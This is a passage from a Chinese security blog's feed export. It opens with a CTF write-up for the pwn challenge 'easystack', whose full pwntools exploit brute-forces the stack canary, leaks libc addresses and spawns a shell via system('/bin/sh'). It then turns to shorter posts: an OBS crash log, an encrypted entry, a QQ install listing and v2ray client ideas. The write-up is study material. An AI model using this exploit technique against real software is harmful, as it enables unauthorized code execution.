title="easystack"></a>easystack</h2><p>看着很简单。。。然后不会做，后面发觉了，利用数学就可以计算出来，计算有几个比canary大的，逐字节爆破，</p><p>假如你输入了0x00000000-0xff000000,这么多个数，再加上填充到canary处的数，总共为301个<br>那计算出来的就是比canary大的数有几个，假设有70个，那在减掉填充的45个，就还有35个，意思从255开始往前数35个就是canary那一位的大小，<br>难点在封装成函数。。我觉得。。通常从低位往高位爆破，高往低，第一次写，太菜了</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./easystack'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_one_gadget</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line"><span class="comment">#one_gadget = one_gadget(libc.path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_canary</span><span class="params">(idx, canary=<span class="number">0</span>)</span>:</span></span><br><span class="line">    num = <span class="number">301</span></span><br><span class="line">    sla(<span class="string">": "</span>, num)</span><br><span class="line">    start = <span class="number">1</span></span><br><span class="line">    end = start + <span class="number">0xff</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(start, end):</span><br><span class="line">        payload = str(canary + (i &lt;&lt; ((<span class="number">3</span>-idx)*<span class="number">8</span>)))</span><br><span class="line">        print(<span class="string">"payload: "</span>, payload)</span><br><span class="line">        sla(<span class="string">":"</span>, payload)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">45</span>):</span><br><span class="line">        payload = str(canary + (<span class="number">0xff</span> &lt;&lt; ((<span class="number">3</span>-idx)*<span class="number">8</span>)))</span><br><span class="line">        sla(<span class="string">":"</span>, payload)</span><br><span class="line">    sla(<span class="string">":"</span>, <span class="string">"0"</span>)</span><br><span class="line">    ru(<span class="string">"answer is "</span>)</span><br><span class="line">    answer = int(r(<span class="number">3</span>))</span><br><span class="line">    canary = <span class="number">0xff</span> - (answer <span class="number">-45</span>)</span><br><span class="line">    sla(<span class="string">"(y or n)\n"</span>, <span class="string">"y"</span>)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_canary</span><span class="params">()</span>:</span></span><br><span class="line">    canary1 = burp_canary(<span class="number">0</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">    canary2 = burp_canary(<span class="number">1</span>, canary1) &lt;&lt; <span class="number">16</span></span><br><span class="line">    canary3 = burp_canary(<span class="number">2</span>, canary1 + canary2) &lt;&lt; <span class="number">8</span></span><br><span class="line">    canary = canary1 + canary2 + canary3</span><br><span class="line">    lg(<span class="string">"canary1"</span>, canary1)</span><br><span class="line">    lg(<span class="string">"canary2"</span>, canary2)</span><br><span class="line">    lg(<span class="string">"canary3"</span>, canary3)</span><br><span class="line">    lg(<span class="string">"canary"</span>, canary)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    canary = get_canary()</span><br><span class="line">    num = <span class="number">308</span></span><br><span class="line">    sla(<span class="string">"How much do you want to calc: "</span>, <span class="number">308</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">300</span>):</span><br><span class="line">        sla(<span class="string">":"</span>, str(<span class="number">0xffffffff</span>))</span><br><span class="line">    sla(<span class="string">":"</span>, str(canary))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        sla(<span class="string">":"</span>, str(<span class="number">1</span>))</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc'</span>]</span><br><span class="line">    ret_addr = <span class="number">0x80488E7</span></span><br><span class="line">    cout = <span class="number">0x804A0C0</span></span><br><span class="line">    __libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    sla(<span class="string">":"</span>, str(puts_plt))</span><br><span class="line">    sla(<span class="string">":"</span>, str(ret_addr))</span><br><span class="line">    sla(<span class="string">":"</span>, str(cout))</span><br><span class="line">    sla(<span class="string">":"</span>, str(__libc_start_main_got))</span><br><span class="line">    sla(<span class="string">"n)"</span>, <span class="string">"y"</span>)</span><br><span class="line">    ru(<span class="string">"\n"</span>)</span><br><span class="line">    addr = uu32(r(<span class="number">4</span>))</span><br><span class="line">    libc.address = addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">    num = <span class="number">306</span></span><br><span class="line">    sla(<span class="string">"How much do you want to calc: "</span>, <span class="number">308</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">300</span>):</span><br><span class="line">        sla(<span class="string">":"</span>, str(<span class="number">0xffffffff</span>))</span><br><span class="line">    sla(<span class="string">":"</span>, str(canary))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        sla(<span class="string">":"</span>, str(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">":"</span>, str(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">    sla(<span class="string">":"</span>, str(ret_addr))</span><br><span class="line">    sla(<span class="string">":"</span>, str(libc.search(<span class="string">"/bin/sh"</span>).next()))</span><br><span class="line">    sla(<span class="string">"stop): "</span>, <span class="string">"0"</span>)</span><br><span class="line">    sla(<span class="string">"n)"</span>, <span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>这几道题学到了好多东西</li><li>shellcode编写，mprotect改内存页权限，SROP</li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/89fa1574/">https://noone-hub.github.io/posts/89fa1574/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>二进制,pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>日常生活记录的漏洞点</title>
    <url>/posts/a0edc8cf/</url>
    <content><![CDATA[<h1 id="obs-pwn"><a href="#obs-pwn" class="headerlink" title="obs_pwn"></a>obs_pwn</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└──╼ <span class="variable">$obs</span> </span><br><span class="line">Attempted path: share/obs/obs-studio/locale/en-US.ini</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/locale/en-US.ini</span><br><span class="line">Attempted path: share/obs/obs-studio/locale.ini</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/locale.ini</span><br><span class="line">Attempted path: share/obs/obs-studio/themes/Dark.qss</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/themes/Dark.qss</span><br><span class="line">info: CPU Name: Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz</span><br><span class="line">info: CPU Speed: 3480.843MHz</span><br><span class="line">info: Physical Cores: 2, Logical Cores: 4</span><br><span class="line">info: Physical Memory: 11782MB Total, 3611MB Free</span><br><span class="line">info: Kernel Version: Linux 5.2.0-2parrot1-amd64</span><br><span class="line">info: Distribution: <span class="string">"Parrot GNU/Linux"</span> <span class="string">"4.7"</span></span><br><span class="line">info: Window System: X11.0, Vendor: The X.Org Foundation, Version: 1.20.4</span><br><span class="line">info: Portable mode: <span class="literal">false</span></span><br><span class="line">Attempted path: share/obs/obs-studio/themes/Dark/no_sources.svg</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/themes/Dark/no_sources.svg</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_advAudioProps_clicked()</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_advAudioProps_destroyed()</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_program_customContextMenuRequested(QPoint)</span><br><span class="line">info: OBS 0.0.1 (linux)</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: audio settings reset:</span><br><span class="line">	samples per sec: 44100</span><br><span class="line">	speakers:        2</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: Initializing OpenGL...</span><br><span class="line">info: Loading up OpenGL on adapter Intel Open Source Technology Center Mesa DRI Intel(R) HD Graphics 620 (Kaby Lake GT2) </span><br><span class="line">info: OpenGL loaded successfully, version 4.5 (Core Profile) Mesa 19.1.6, shading language 4.50</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: video settings reset:</span><br><span class="line">	base resolution:   1920x1080</span><br><span class="line">	output resolution: 1280x720</span><br><span class="line">	downscale filter:  Bicubic</span><br><span class="line">	fps:               30/1</span><br><span class="line">	format:            NV12</span><br><span class="line">	YUV mode:          601/Partial</span><br><span class="line">info: NV12 texture support not available</span><br><span class="line">info: Audio monitoring device:</span><br><span class="line">	name: Default</span><br><span class="line">	id: default</span><br><span class="line">info: ---------------------------------</span><br><span class="line">warning: Failed to load <span class="string">'en-US'</span> text <span class="keyword">for</span> module: <span class="string">'decklink-ouput-ui.so'</span></span><br><span class="line">libDeckLinkAPI.so: cannot open shared object file: No such file or directory</span><br><span class="line">info: No blackmagic support</span><br><span class="line">info: FFMPEG VAAPI supported</span><br><span class="line">info: VLC found, VLC video <span class="built_in">source</span> enabled</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info:   Loaded Modules:</span><br><span class="line">info:     vlc-video.so</span><br><span class="line">info:     text-freetype2.so</span><br><span class="line">info:     rtmp-services.so</span><br><span class="line">info:     obs-x264.so</span><br><span class="line">info:     obs-transitions.so</span><br><span class="line">info:     obs-outputs.so</span><br><span class="line">info:     obs-filters.so</span><br><span class="line">info:     obs-ffmpeg.so</span><br><span class="line">info:     linux-v4l2.so</span><br><span class="line">info:     linux-pulseaudio.so</span><br><span class="line">info:     linux-jack.so</span><br><span class="line">info:     linux-decklink.so</span><br><span class="line">info:     linux-capture.so</span><br><span class="line">info:     linux-alsa.so</span><br><span class="line">info:     image-source.so</span><br><span class="line">info:     frontend-tools.so</span><br><span class="line">info:     decklink-ouput-ui.so</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: ==== Startup complete ===============================================</span><br><span class="line">error: Service <span class="string">''</span> not found</span><br><span class="line">info: No scene file found, creating default scene</span><br><span class="line">info: All scene data cleared</span><br><span class="line">info: ------------------------------------------------</span><br><span class="line">info: pulse-input: Server name: <span class="string">'pulseaudio 13.0'</span></span><br><span class="line">info: pulse-input: Audio format: s16le, 44100 Hz, 2 channels</span><br><span class="line">info: pulse-input: Started recording from <span class="string">'alsa_output.pci-0000_00_1f.3.analog-stereo.monitor'</span></span><br><span class="line">info: pulse-input: Server name: <span class="string">'pulseaudio 13.0'</span></span><br><span class="line">info: pulse-input: Audio format: s16le, 44100 Hz, 2 channels</span><br><span class="line">info: pulse-input: Started recording from <span class="string">'alsa_input.pci-0000_00_1f.3.analog-stereo'</span></span><br><span class="line">info: Switched to scene <span class="string">'Scene'</span></span><br><span class="line">warning: Failed to glob scene collections</span><br><span class="line">Attempted path: share/obs/obs-studio/images/overflow.png</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/images/overflow.png</span><br><span class="line">info: adding 23 milliseconds of audio buffering, total audio buffering is now 23 milliseconds (<span class="built_in">source</span>: Mic/Aux)</span><br><span class="line"></span><br><span class="line">^Cinfo: ==== Shutting down ==================================================</span><br><span class="line">info: Switched to scene <span class="string">'(null)'</span></span><br><span class="line">info: pulse-input: Stopped recording from <span class="string">'alsa_output.pci-0000_00_1f.3.analog-stereo.monitor'</span></span><br><span class="line">info: pulse-input: Got 125 packets with 32338 frames</span><br><span class="line">info: pulse-input: Stopped recording from <span class="string">'alsa_input.pci-0000_00_1f.3.analog-stereo'</span></span><br><span class="line">info: pulse-input: Got 271 packets with 118520 frames</span><br><span class="line">info: All scene data cleared</span><br><span class="line">info: ------------------------------------------------</span><br><span class="line">double free or corruption (out)</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/a0edc8cf/">https://noone-hub.github.io/posts/a0edc8cf/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>idea</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>某比赛记录</title>
    <url>/posts/f7a7ccec/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="39f5bd0c1f6506597f85f61324d30c6ec72a0f6558e0c1751e3a4cf3675cb295">89d6e469bc204f85eac3d739fb5239732b26001d0fdc62787c22494fb0e70dc515d457e1c1e313bb704ad14e1b3c2bffb070fd4315e81439aea7f2f03606bf57b347a6160257346f1402f52c431ca92eb226a6f6f83dba8301fd5ad14b9d07728a73e16abb391659b4adcedb953abc23265a6ae55c3a32b4c7c78912f77f64123f6cfc1c95314d105e7b395d4e05de6ad3dfb1cd5bc4823bf5406019357cb4e0cdde82eef6e79909b2db4de54eac5a8ac094b5e08e55a7e4061bd52d6b1e576fc671d988071d2217e366a39f51d87adc9ee130217ee4e034ae84ee521c190acaf94e503c815b7183f3b03b026c17bf65bc4ac8b80ffbcda5dae5f96d59774bb0e412382e2c08a9a918f0bd805f90144499271bcf966ccd8c22d34ef6dd714ed38fe6629c7e11439a0d305afdd102c5d785ca62bd1878454ed861d73e5f9a3ed22c6bcc712e1cc3b60d408b9805c08681ef3f7a23096b3610bd096427b29c36ba2bf696c6a65b0e67f0b742d6a06b15fed5c033c3b3cf31d02c4a9536150094cc12ae97bd018028f119afda9509eb5a1f8e00c5124cb60720e219b12e1099e9103ef0a712061f4aef85283d289d1e74b68a4b33c9f2ad618a3ceaae35ba533115580c1f46b594c63c0b06c656f46bd5955e63b6a54b98d16fe453dfe26e50ef977844a08bf24723351cf8e90aaccafe67b05b6c2ca2fecc8c6f0c8d36a2f351aa112e923506963ca7a758412de4e610d278a2c5198ccaeba3274e50b9921d3b374cb32c0c8ddc316cbdc5c8f111a4af9c2d4c48b06b7553e9f589884d30554cb3dd0c2ef946cef1293309c8cc34228974e79f2a60cf318959402a1d83a224caa360f67fc4ead54fe33eae58b13257f3352ce651e86a01ca9872860f81f4d94a4ecc562b1737be7a5842507d1de34ee378aad2fab11f1262c01875b6207ed042e533ced34045162d72344e6a81831781e9a67d944bff68e30b3de3d45eb343f74e5a42247dc41c245b937b1a916c28479d6875b76cf39c1f6ebf9d8da953885f3f0fb4b2d6a67a10d85d7053b98a7c8cddf49fd41db6210ebd1f9adf1b6373835f54ccc3c0c1bafad946365496f5bf5ed44c305fbb41c32d5cab1ef943dc49f5c4d87a59409c606b9ab76395a6ea70d0f537a925a8bba18d07cabe55385d46521070baaf1e7f499096e2051156e971d7fe56a200ba8b1b95577cea93d34845ae2990b7439c98fd8b1736cd31055731965ad47d031eb6511d7130f1c2a666b0a1770de25511dc56c0d1b2a3f8afa8648f23faa0477944645e006b76a086812b28f9f89275a33fcb17ae1ef0dc24ef8dd5d9a065876b83cb3f0ad465e8b886a70883fe0f8ee82b2f663cfdfefa54b8886b00b6680a20d928d72b027cabdc6d510bd5f570410e52148bd39d6d360b6d81d62aaef6588152aac125fa25a68b2e0ef2404a8e42df1f2a544afd40bc2462d12f287b012b16a9254950c21c387e8582d27dcdd485c5f7c490feec40c0d525a5ac48d2d22a10ad6a4ac3230b6fa89dad47ed90a8dca1b48b669755cb7a5645132c536cd98703f990c5ed83ef9eed2059e141a4c3c76ed400f42b247bba088da8af0694f7efa42dc9f958a34778cef77b46a6e98e54adc5e0cf07cab98ce0fc1ee02d352c53d5bd0745ee0a8c8f47da1dccf10a1d5ce694a510f4f55b87fa0cacd854373c01fd07cdbf3f10845b22d005f657bcc70105bdeea64678c50eaafe1026f0ae156bf3d06190c7f3a3a77445acfaac9e2865a87d2104bc6bc119784e7f40e54f523fa60f4de86a410a08bf7b76c00935250fe85537031bf4041639a5a452895fd0d9efbfd87ff0ea8bf911b0c0ca30dac3088da6a4434261ea023d915cc2c74845061fb40f8270c5f5ded008cb7d0a17a24f157b0687b988b54f6661de4685bf9b3acbdb805e9925a6f57794c2e2728d37528d27d890ef2909155b1d107099002506367919344b5baf312d56417388a629f881c435903751f4a2a71c60ff35032556f3d70289bd4c2a8f95236ede28f49f926ed62322e740c051c713839e272b514eda8348420670ec432bce31a66fd7055a96d6b2d626ba9f3a69c86fbb314c643ffd29486b48fd8bd46d70e53fc40c05f202a3e9f4e5c2e2a7a98955fe85219bbccf1fbda8581532dfe4934e143e4b3198945a5ec0912e752c789e7c9b02e5cfd483de70655d28f644798532f1460670f344f2d2afe9515a58e511ed521022595662c6ed3eb6c893a444c749df86c3d81361467454eecfd87108c0a41c00e5b14b5635046a0d93581b322938e4c613f49bd31ee8f4a3b2d04ca66092f59bcbef3b7ee6a4746a4bd77a246830c434aebc318a3b6e05301e067b874d5de0f5d9b31a95f4b1932d78e93a2c21ea883b0b487940b74f59ccd0780c9f1a0cfaa56c40ea138c1d084a28a924f9cc43875b34f51a7b9a26d4b2ff331cf34a7bfc59b88eb390c55a6caa97ef32e540e50562f0cf51a441c615235d0023a679febac9dc02134fa5de368806adefc8cd10ced234e926450253b43f73b1ac088cb797cbfa42c2def2009857f240b25f984b86a2e4e97e4b2eebef254b4e8229de30e0a96cc98766747c79059e597f8346274602ab5630c8eb6bba49838d03af10626b27a7f33af0678dc61f42bc0e8ce50f63efc34db94b5ba37ddf38a437a7a2026cdce280992920b2ff9b5578fc267b706d7761f1f073d9b39861b9b109c54ac069ec524c22963fa360324b1c35b44f7b4da18b7e989958f0ec33c7cae76e85dedb2f5c0d8743347047625125306e5da044f12971abb1065485861f0666646accac66b26b6452f4e01eee3a901c57535f3d91e42338435b747e22712767b14481f09d9465f23374644d968389104a24a07daedcd8f5a5d7dd7c7c85a9db53198b0aff66d34156ca8e7fd0262ff1c402076f48a3d4e27284a1769a9af3e04cb93f9854a9ddf9388ff663d55014fde5825320409ab73f92bbf9ff7bef47ed46abd2604b8f20057b7f7d4b5532fedfa93f28ef61340926a9461d8e7bab302248fe9d712415a955e57589dfd890a9d8ff8dba84e8c342b5c968c4bfbd4a890393c0a2ff9dc3014cae67f6b855b3da9156f745c48d1ccf171d832c264e14af11d8da433866dea5ef7a9df5524c085c0d4f29746c3c8cda5f4146d04429c302f9dceeeef432c39991cac57a99b60feaa4802de9c558d068f13c16abe4fab0f431fed749f87fe6235330ccf36a01c353103989a1636dc8bdf327233dc74e5b9a7226d903eb7235ffa99c1796f09258a2c8c70435750ba8ec761763b4e324032afb8b665be3c9c3e20c2c56c88582222188d5a39d78a8f121305c599e597b333efc285132c59020f5dc0c9811697bd813fc9293eda560ce9e5821f4a4f2185fc8aad83b084ada2f90327ff9ec6deb622e0b04c0917ee9df6f741da6bbc5ad51519f1a3222d4f5ca1cda0c80146538fd20f7cd5f3700f7724af95870ba3f098f28273856ccb401160f5c34d1b89cb5cf3cca49e4d92d7ac8293710b9a51a322461d8c38f7fe4eac7a315b8e1de080ad2f5e44cffa3d2ef608d5696adab3c976ba71648ef57469f44545e266ff8648af6cee8da1642bea3c1c43c5b556a94d1e0b63388b55289c71f4308c2977f72f47963f37564a8d57422f3d0710d9c9f09fc38e3058f98ec90e02c27dde7b7941fd4d9b16c6bc57326d955120641970ad4347735c7d1502ecf8064710caa972930cba021b9efd52a0e745c73bc06b1efd5135db2979613d29a612fe25cc2df7f86ccf57c0c13c78d8c37d7e96093b5a272651344bd02ef83ec8f49c612f1ee518865718c8c7967f1a96bbea2802e80cd86a63e71ed307d9cbb4c870cfdc0df3975b5a3b7f525a985ddac9cfe23920e1dc6fd7fd18f07ffcb025a007841e801055d50074a9f763eb3a633065ef76a6bc780a9596b15cbf674928ceb08dc29ee636620d34a18e31a71f43fac2510721f4e711b2e66ab81fb033f7f5e50a63eddbcf1ace8b04198f4c8a1fe97355c7882e7568d026b5250b04e6e933a335ff2c361cf37de7c0cabf7fa8cfe9a1518e1c3990b81cd1be04916afeb70ba1d6391ea3d0524939a9345943125f32cdbba62984fb57136dd16587bfa2cdb44f3f35d9c32178de2a4d889a9f37f116a35b7d48b29e5b807bdfba25b6f658ce72c9afac5ff0c2c5450661d9bb9515de725134d5fc74faf69e0f6f5e346b684a8c2f3a6ce0c8c9d65f19ccab6271d40e1d4493fe2542bdd643141c5358c1eb259f6e2e6c1d1cde0abfab28640ca436655bf94f6abff2d888394ac6aa30ac0a5ab201b13dc2522062675c82f1a76551399d2a8e61ed68140ee47317cc16bf95fa6e74ce0ae0161bca050cd3ff2da286b4c7ff4b257db40c67c08c2024017b2205b370fb8b158d28feeba700c346a0d407df119b3ce8e16f3ece11bffedc2ae988062077a7572a08727dc5ec51d9876b94aa275512f00cab1ac9214e7d26e9a22fbfa021cc121bd3ecaa0aa42245d169a1c86267f1a9faa1561dc2fe02399a6fc3bcb7da04929f590bed58a0c73a353b183683ff252390f307f862f523a2a42bbe07172c2ce444d5fcbe5c3ff5144274779884ff37438c3e1170ab01676a8e5ec5fc0244602c18bd4202efd1dfe4bb6154921a4ce885929e25181e4ba0a05580e447bde663821bee9476400f7b5be0ce766ce059567f170d345e8e17fbd82377a0ec39ab74e84dae87ff290d28cd89e8928f31e2b6df533c4367c6591bf8492c83ea6b7e7103f46a7b6b478cc460bb29b1d1bda8ace77645fd7e4d950b342cc035dec9245c17e666bdc96df35494e1c36c89682319c969e4f986d348841480656c6bce93ae8c61970e2a5c981a808cfb355d4d093ccd95138fafe8422335c40a2b017ec06bcb4c1882d9dd6e9d95b7f6311dcdc098c6255eab9b6bfe87e72bd40c6f500a47d351b9a59ec83d9897c38a635db359255a149d062dcaa2b02d9b7ebf736d799c09e4a554806991e012a47d58488e2b6717e4d0df4832128f1bb84ffe2a5361e5fe16d7a5fdc0bd358a9c7ed9b482277edf07f3b6458cb0144ac68c74cf48cf0e4ccff3e057d696c24998352ec14a3b7bf7c4a51afbe0721ea9b2856baa56aed5c56dd525d082f30499cfc7fbe40a954b96271d3b73ad6da808135b7f76ea1e3222bf47b6cc52f59b4b3e960d2a0609a25ce1270d31fe72af4bf25135e309218dc58b82d4dd04d997fccafae4cfd06cdb153f7703af09c2335b5a4969808c049894e0fdec4ec10ef1de65cffe74277b7b9990dc85df44fa6513a2f81ad05e6e9eecb59cf9bc62499571bc2fa2963f90cb99a26a2674ff9a1057c2706eb51f39c835e1ca48eafcf6957de158461d84fb2d7e32e9809279f017afd3b99887346f050b56e371543d9652550d14b49d8f519399b6eafc932e993c7e76417808bda50522a65fd4db025bf8f0463a264ee2017991f2d1e38a016c0609a7e1bf4acc24399ee45a5b9d6a212fb88989ef7c5cfe6dd8ad5e94673fce7f39f67154ff792ac464a6ffc62674dfdf35535d87900849f0b19b0bf7366ee3ada95840a0c41757f60302d5535a5ea7ee0262acf17c715a85d7bf854e89e52245dd11fe7b56a8de1fe33ccc9ebd15a76c78cd0</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>web安全,练习</tag>
      </tags>
  </entry>
  <entry>
    <title>linux qq测试</title>
    <url>/posts/d100f3b8/</url>
    <content><![CDATA[<h1 id="tencentqq"><a href="#tencentqq" class="headerlink" title="tencentqq"></a>tencentqq</h1><p>installing /usr/share/applications/qq.desktop<br>installing /usr/share/tencent-qq/qq<br>installing /usr/share/tencent-qq/qq.png<br>installing /usr/share/tencent-qq/qq.bmp<br>installing /usr/share/tencent-qq/res.db<br>installing /usr/share/tencent-qq/crashpad_handler</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/d100f3b8/">https://noone-hub.github.io/posts/d100f3b8/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>linux,测试</tag>
      </tags>
  </entry>
  <entry>
    <title>v2ray_linux客户端构思</title>
    <url>/posts/d59440d9/</url>
    <content><![CDATA[<h1 id="功能构思"><a href="#功能构思" class="headerlink" title="功能构思"></a>功能构思</h1><ol><li>修改监听端口</li><li>导入vmess</li><li>指定配置文件替换</li><li>界面输入配置进行更换</li><li>多账号切换</li><li>订阅更新</li><li>修改配置</li></ol><p>初步想法，做好后利用docker挂载/etc/v2ray目录，通过docker修改配置文件</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/d59440d9/">https://noone-hub.github.io/posts/d59440d9/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux,v2ray,gui,客户端</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫学习1</title>
    <url>/posts/3e78770/</url>
